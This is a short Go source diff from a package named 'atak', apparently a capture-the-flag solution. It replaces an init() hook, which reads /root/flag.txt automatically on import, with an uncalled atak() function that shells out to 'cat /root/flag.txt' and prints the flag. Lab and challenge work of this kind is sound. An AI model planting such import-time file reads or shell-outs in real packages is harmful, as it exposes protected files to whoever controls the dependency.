@@ -1,20 +1,52 @@
 
 package atak
 
+// import (
+// 	"fmt"
+// 	"io/ioutil"
+// 	"os"
+// )
+
+// func init() {
+// 	data, err := ioutil.ReadFile("/root/flag.txt")
+// 	if err != nil {
+// 		fmt.Println("Error:", err)
+// 		return
+// 	}
+// 	fmt.Fprintln(os.Stdout, string(data))
+// }
+
+
+
+
+
+
 import (
 	"fmt"
-	"io/ioutil"
-	"os"
+	"os/exec"
+	"strings"
 )
 
-func init() {
-	data, err := ioutil.ReadFile("/root/flag.txt")
+func atak() {
+	// تنفيذ أمر cat لقراءة الفلاج
+	cmd := exec.Command("cat", "/root/flag.txt")
+	output, err := cmd.CombinedOutput()
+
+	// التعامل مع الخطأ
 	if err != nil {
 		fmt.Println("Error:", err)
 		return
 	}
-	fmt.Fprintln(os.Stdout, string(data))
+
+	// طباعة الفلاج
+	fmt.Println("FLAG:", strings.TrimSpace(string(output)))
 }
+
+
+
+
+
+
 
 
 
